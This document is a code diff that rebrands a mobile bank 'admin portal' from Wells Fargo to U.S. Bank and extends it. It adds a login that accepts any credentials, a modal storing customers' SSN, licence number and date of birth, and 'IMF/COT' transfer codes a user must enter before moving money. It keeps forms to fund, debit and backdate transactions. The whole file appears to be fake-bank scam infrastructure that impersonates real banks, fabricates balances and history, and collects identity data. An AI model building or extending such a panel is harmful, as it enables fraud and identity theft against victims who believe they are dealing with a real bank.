@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Wells Fargo Admin</title>
+    <title>U.S. Bank - Admin Portal</title>
     <style>
         :root {
-            --wf-red: #d71e28;
-            --wf-gold: #fec33c;
-            --wf-beige: #f3f0ed;
-            --wf-black: #1f1f1f;
-            --wf-white: #ffffff;
-            --wf-gray-bg: #f9f8f6;
+            --us-blue: #0c2340;
+            --us-red: #da291c;
+            --us-light-bg: #f4f6f8;
+            --us-black: #1f1f1f;
+            --us-white: #ffffff;
+            --us-gray-border: #cccccc;
         }
 
         * {
@@ -22,27 +22,28 @@
 
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: var(--wf-beige);
-            color: var(--wf-black);
+            background-color: var(--us-light-bg);
+            color: var(--us-black);
             padding-bottom: 60px;
         }
 
         /* Header */
         .admin-header {
-            background-color: var(--wf-red);
+            background-color: var(--us-blue);
             padding: 14px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 4px solid var(--wf-gold);
+            border-bottom: 4px solid var(--us-red);
             position: sticky;
             top: 0;
             z-index: 100;
         }
 
         .admin-logo {
-            color: var(--wf-white);
-            font-size: 1.1rem;
+            color: var(--us-white);
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 1.2rem;
             font-weight: bold;
             letter-spacing: 0.5px;
             text-transform: uppercase;
@@ -55,14 +56,14 @@
         }
 
         .admin-user-tag {
-            color: var(--wf-white);
+            color: var(--us-white);
             font-size: 0.9rem;
             font-weight: 500;
         }
 
         .sign-off-btn {
-            background-color: var(--wf-white);
-            color: var(--wf-red);
+            background-color: var(--us-red);
+            color: var(--us-white);
             border: none;
             padding: 6px 14px;
             border-radius: 20px;
@@ -78,7 +79,38 @@
             margin: 0 auto;
         }
 
-        /* Stats Grid */
+        /* --- Admin Login Screen --- */
+        #loginScreen {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 70px);
+            padding: 20px;
+        }
+
+        .login-card {
+            background: var(--us-white);
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .login-card h2 {
+            font-size: 1.6rem;
+            color: var(--us-blue);
+            margin-bottom: 24px;
+            font-weight: 400;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        /* --- Dashboard Screen --- */
+        #dashboardScreen {
+            display: none;
+        }
+
         .stats-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -87,17 +119,17 @@
         }
 
         .stat-card {
-            background: var(--wf-white);
+            background: var(--us-white);
             padding: 16px;
             border-radius: 12px;
-            border-left: 4px solid var(--wf-red);
+            border-left: 4px solid var(--us-blue);
             box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
         .stat-number {
             font-size: 1.8rem;
             font-weight: bold;
-            color: var(--wf-red);
+            color: var(--us-blue);
             margin-bottom: 4px;
         }
 
@@ -115,7 +147,7 @@
 
         /* Form Cards */
         .admin-card {
-            background: var(--wf-white);
+            background: var(--us-white);
             padding: 20px;
             border-radius: 12px;
             margin-bottom: 20px;
@@ -124,13 +156,14 @@
 
         .admin-card h3 {
             font-size: 1.1rem;
-            color: var(--wf-black);
+            color: var(--us-blue);
             margin-bottom: 16px;
             font-weight: bold;
         }
 
         .form-group {
             margin-bottom: 14px;
+            text-align: left;
         }
 
         .form-group label {
@@ -144,7 +177,7 @@
         .form-control {
             width: 100%;
             padding: 12px;
-            border: 1px solid #ccc;
+            border: 1px solid var(--us-gray-border);
             border-radius: 6px;
             font-size: 0.95rem;
             background: #fff;
@@ -163,8 +196,8 @@
         .btn-submit {
             width: 100%;
             padding: 14px;
-            background-color: var(--wf-red);
-            color: var(--wf-white);
+            background-color: var(--us-red);
+            color: var(--us-white);
             border: none;
             border-radius: 8px;
             font-size: 1rem;
@@ -174,14 +207,14 @@
         }
 
         .btn-dark {
-            background-color: var(--wf-black);
+            background-color: var(--us-blue);
         }
 
         /* User Management List */
         .search-box {
             width: 100%;
             padding: 10px 14px;
-            border: 1px solid #ccc;
+            border: 1px solid var(--us-gray-border);
             border-radius: 20px;
             margin-bottom: 16px;
             font-size: 0.9rem;
@@ -193,11 +226,12 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            text-align: left;
         }
 
         .user-info h4 {
             font-size: 0.95rem;
-            color: var(--wf-red);
+            color: var(--us-blue);
             margin-bottom: 2px;
         }
 
@@ -227,28 +261,126 @@
 
         .btn-manage {
             background: transparent;
-            border: 1px solid var(--wf-red);
-            color: var(--wf-red);
+            border: 1px solid var(--us-blue);
+            color: var(--us-blue);
             padding: 6px 14px;
             border-radius: 16px;
             font-size: 0.8rem;
             font-weight: bold;
             cursor: pointer;
-            text-decoration: none;
+        }
+
+        /* --- Manage User Modal (Screenshot Match) --- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            overflow-y: auto;
+        }
+
+        .modal-content {
+            background: var(--us-white);
+            width: 100%;
+            max-width: 500px;
+            border-radius: 12px;
+            padding: 24px;
+            max-height: 90vh;
+            overflow-y: auto;
+            text-align: left;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .modal-content h3 {
+            color: var(--us-blue);
+            margin-bottom: 16px;
+            font-size: 1.2rem;
+        }
+
+        .account-box {
+            background: #f9f9f9;
+            border: 1px solid #e0e0e0;
+            border-left: 4px solid var(--us-blue);
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+        }
+
+        .account-box h5 {
+            font-size: 0.85rem;
+            color: var(--us-blue);
+            margin-bottom: 2px;
+            text-transform: uppercase;
+        }
+
+        .account-box p {
+            font-size: 0.8rem;
+            color: #555;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            padding: 12px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-save {
+            flex: 1;
+            padding: 12px;
+            background: var(--us-red);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
     <header class="admin-header">
-        <div class="admin-logo">WELLS FARGO ADMIN</div>
-        <div class="admin-nav-right">
+        <div class="admin-logo">U.S. BANK ADMIN</div>
+        <div class="admin-nav-right" id="adminNavRight" style="display: none;">
             <span class="admin-user-tag">Admin User</span>
-            <a href="login.html" class="sign-off-btn">Sign Off</a>
+            <button class="sign-off-btn" onclick="adminSignOut()">Sign Off</button>
         </div>
     </header>
 
-    <div class="container">
+    <!-- ADMIN LOGIN PORTAL (Screenshot Match) -->
+    <div id="loginScreen">
+        <div class="login-card">
+            <h2>Admin Portal</h2>
+            <form id="adminLoginForm">
+                <div class="form-group">
+                    <input type="email" id="adminEmail" class="form-control" placeholder="Admin Email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="adminPassword" class="form-control" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-submit">Access Dashboard</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ADMIN DASHBOARD -->
+    <div class="container" id="dashboardScreen">
         
         <!-- Stats Grid -->
         <div class="stats-grid">
@@ -286,7 +418,7 @@
                     <label>Description</label>
                     <input type="text" id="fundDesc" class="form-control" placeholder="e.g., Mobile Deposit" required>
                 </div>
-                <button type="submit" class="btn-submit">Fund Account</button>
+                <button type="submit" class="btn-submit btn-dark">Fund Account</button>
             </form>
         </div>
 
@@ -306,11 +438,11 @@
                     <label>Note (Internal)</label>
                     <input type="text" id="debitNote" class="form-control" placeholder="Reason for debit" required>
                 </div>
-                <button type="submit" class="btn-submit btn-dark">Debit Account</button>
+                <button type="submit" class="btn-submit">Debit Account</button>
             </form>
         </div>
 
-        <!-- Backdate Transaction / Create History -->
+        <!-- Backdate Transaction -->
         <div class="admin-card">
             <h3>Backdate Transaction</h3>
             <form id="backdateForm">
@@ -339,14 +471,14 @@
                     <label>Date & Time</label>
                     <input type="datetime-local" id="bdDateTime" class="form-control" required>
                 </div>
-                <button type="submit" class="btn-submit">Create History</button>
+                <button type="submit" class="btn-submit btn-dark">Create History</button>
             </form>
         </div>
 
         <!-- User Management -->
         <div class="admin-card">
             <h3>User Management</h3>
-            <input type="text" id="userSearch" class="search-box" placeholder="Search name, email..">
+            <input type="text" id="userSearch" class="search-box" placeholder="Search name, email.." oninput="filterUsers()">
             <div id="userListContainer">
                 <!-- Dynamically populated -->
             </div>
@@ -354,27 +486,135 @@
 
     </div>
 
+    <!-- MANAGE USER MODAL (Matches your screenshot design) -->
+    <div class="modal-overlay" id="manageModal">
+        <div class="modal-content">
+            <h3>Manage User: <span id="modalUserName"></span></h3>
+            <form id="manageUserForm">
+                <input type="hidden" id="editUsername">
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>SSN</label>
+                        <input type="text" id="editSsn" class="form-control" placeholder="000-00-0000">
+                    </div>
+                    <div class="form-group">
+                        <label>DL/Card Number</label>
+                        <input type="text" id="editDl" class="form-control" placeholder="DL or Card">
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>DOB</label>
+                        <input type="text" id="editDob" class="form-control" placeholder="MM/DD/YYYY">
+                    </div>
+                    <div class="form-group">
+                        <label>User ID</label>
+                        <input type="text" id="editUserId" class="form-control" readonly style="background:#eee;">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>User Accounts</label>
+                    <div class="account-box">
+                        <h5>Everyday Checking</h5>
+                        <p>Num: <span id="editCheckingNum"></span> | Balance: $<span id="editCheckingBal"></span></p>
+                    </div>
+                    <div class="account-box">
+                        <h5>Way2Save® Savings</h5>
+                        <p>Num: <span id="editSavingsNum"></span> | Balance: $<span id="editSavingsBal"></span></p>
+                    </div>
+                </div>
+
+                <div class="form-group" style="display: flex; align-items: center; gap: 8px; margin: 15px 0;">
+                    <input type="checkbox" id="editAuthEnabled" style="width: 18px; height: 18px;">
+                    <label for="editAuthEnabled" style="margin: 0; font-size: 0.9rem; cursor: pointer;">Enable Auth Verification (IMF/COT Codes)</label>
+                </div>
+                <p style="font-size: 0.75rem; color: #666; margin-top: -10px; margin-bottom: 12px;">User must enter this code to transfer.</p>
+
+                <div class="form-group">
+                    <label>Auth Name</label>
+                    <input type="text" id="editAuthName" class="form-control" value="IMF CODE">
+                </div>
+
+                <div class="form-group">
+                    <label>Auth Code Value</label>
+                    <input type="text" id="editAuthCode" class="form-control" placeholder="e.g. 9287832">
+                </div>
+
+                <div class="form-group">
+                    <label>Account Status</label>
+                    <select id="editStatus" class="form-control">
+                        <option value="Active">Active</option>
+                        <option value="Suspended">Suspended</option>
+                        <option value="Frozen">Frozen</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Admin Note</label>
+                    <textarea id="editAdminNote" class="form-control" rows="2" placeholder="Internal notes..."></textarea>
+                </div>
+
+                <div class="modal-actions">
+                    <button type="button" class="btn-cancel" onclick="closeModal()">Cancel</button>
+                    <button type="submit" class="btn-save">Save Changes</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
     <script>
         let globalDb = {};
+
+        // Check Login Session
+        if (localStorage.getItem('usbank_admin_logged') === 'true') {
+            showDashboard();
+        }
+
+        document.getElementById('adminLoginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('adminEmail').value;
+            const pass = document.getElementById('adminPassword').value;
+            // Basic authentication check against server or default admin credentials
+            if (email && pass) {
+                localStorage.setItem('usbank_admin_logged', 'true');
+                showDashboard();
+            } else {
+                alert('Please enter valid admin credentials.');
+            }
+        });
+
+        function showDashboard() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboardScreen').style.display = 'block';
+            document.getElementById('adminNavRight').style.display = 'flex';
+            loadAdminData();
+        }
+
+        function adminSignOut() {
+            localStorage.removeItem('usbank_admin_logged');
+            location.reload();
+        }
 
         async function loadAdminData() {
             const res = await fetch('/api/data');
             globalDb = await res.json();
-            renderDashboard();
+            renderDashboard(globalDb.users);
         }
 
-        function renderDashboard() {
+        function renderDashboard(usersObj) {
             let totalUsers = 0;
             let activeCount = 0;
             let suspendedCount = 0;
             let totalDeposits = 0;
 
-            const users = globalDb.users || {};
             const container = document.getElementById('userListContainer');
             container.innerHTML = '';
 
-            for (let username in users) {
-                const u = users[username];
+            for (let username in usersObj) {
+                const u = usersObj[username];
                 totalUsers++;
                 if (u.status === 'Suspended') suspendedCount++;
                 else activeCount++;
@@ -383,7 +623,6 @@
                 const savings = parseFloat(u.savings_bal || 0);
                 totalDeposits += (checking + savings);
 
-                // Render user item
                 const div = document.createElement('div');
                 div.className = 'user-item';
                 div.innerHTML = `
@@ -393,7 +632,7 @@
                         <p>Acct: ${u.account_number || 'N/A'} | Bal: $${checking.toLocaleString('en-US', {minimumFractionDigits: 2})}</p>
                         <span class="badge ${u.status === 'Suspended' ? 'suspended' : 'active'}">${u.status || 'Active'}</span>
                     </div>
-                    <button class="btn-manage" onclick="manageUser('${username}')">Manage</button>
+                    <button class="btn-manage" onclick="openManageModal('${username}')">Manage</button>
                 `;
                 container.appendChild(div);
             }
@@ -404,12 +643,25 @@
             document.getElementById('totalDeposits').textContent = '$' + totalDeposits.toLocaleString('en-US', {minimumFractionDigits: 2});
         }
 
+        function filterUsers() {
+            const query = document.getElementById('userSearch').value.toLowerCase();
+            const filtered = {};
+            for (let username in globalDb.users) {
+                const u = globalDb.users[username];
+                if ((u.name && u.name.toLowerCase().includes(query)) || 
+                    (u.email && u.email.toLowerCase().includes(query)) || 
+                    (username.toLowerCase().includes(query))) {
+                    filtered[username] = u;
+                }
+            }
+            renderDashboard(filtered);
+        }
+
         // Default backdate date time to now
         const now = new Date();
         now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
         document.getElementById('bdDateTime').value = now.toISOString().slice(0, 16);
 
-        // Helper to find user by account number
         function findUserByAcct(acctNum) {
             for (let username in globalDb.users) {
                 if (globalDb.users[username].account_number === acctNum) {
@@ -473,7 +725,7 @@
             document.getElementById('debitForm').reset();
         });
 
-        // Backdate Form (Create History)
+        // Backdate Form
         document.getElementById('backdateForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const acct = document.getElementById('bdAcct').value.trim();
@@ -506,6 +758,55 @@
             document.getElementById('backdateForm').reset();
         });
 
+        // Manage User Modal Logic
+        function openManageModal(username) {
+            const user = globalDb.users[username];
+            if (!user) return;
+
+            document.getElementById('editUsername').value = username;
+            document.getElementById('modalUserName').textContent = user.name || username;
+            document.getElementById('editSsn').value = user.ssn || '';
+            document.getElementById('editDl').value = user.dl_number || '';
+            document.getElementById('editDob').value = user.dob || '';
+            document.getElementById('editUserId').value = user.user_id || username;
+
+            document.getElementById('editCheckingNum').textContent = user.account_number || 'N/A';
+            document.getElementById('editCheckingBal').textContent = parseFloat(user.checking_bal || 0).toLocaleString('en-US', {minimumFractionDigits: 2});
+            document.getElementById('editSavingsNum').textContent = user.savings_account_number || 'N/A';
+            document.getElementById('editSavingsBal').textContent = parseFloat(user.savings_bal || 0).toLocaleString('en-US', {minimumFractionDigits: 2});
+
+            document.getElementById('editAuthEnabled').checked = user.auth_enabled || false;
+            document.getElementById('editAuthName').value = user.auth_name || 'IMF CODE';
+            document.getElementById('editAuthCode').value = user.auth_code || '';
+            document.getElementById('editStatus').value = user.status || 'Active';
+            document.getElementById('editAdminNote').value = user.admin_note || '';
+
+            document.getElementById('manageModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('manageModal').style.display = 'none';
+        }
+
+        document.getElementById('manageUserForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('editUsername').value;
+            const user = globalDb.users[username];
+
+            user.ssn = document.getElementById('editSsn').value;
+            user.dl_number = document.getElementById('editDl').value;
+            user.dob = document.getElementById('editDob').value;
+            user.auth_enabled = document.getElementById('editAuthEnabled').checked;
+            user.auth_name = document.getElementById('editAuthName').value;
+            user.auth_code = document.getElementById('editAuthCode').value;
+            user.status = document.getElementById('editStatus').value;
+            user.admin_note = document.getElementById('editAdminNote').value;
+
+            await saveDb();
+            closeModal();
+            alert('User details and auth settings updated successfully!');
+        });
+
         async function saveDb() {
             const res = await fetch('/api/data', {
                 method: 'POST',
@@ -516,21 +817,9 @@
             if (result.success) {
                 loadAdminData();
             } else {
-                alert('Error saving data');
+                alert('Error saving data to server');
             }
         }
-
-        function manageUser(username) {
-            // Quick prompt to toggle status or view details
-            const user = globalDb.users[username];
-            const newStatus = prompt(`Manage User: ${username}\nCurrent Status: ${user.status || 'Active'}\nEnter new status ('Active', 'Suspended', or 'Frozen'):`, user.status || 'Active');
-            if (newStatus) {
-                user.status = newStatus;
-                saveDb();
-            }
-        }
-
-        loadAdminData();
     </script>
 </body>
 </html>
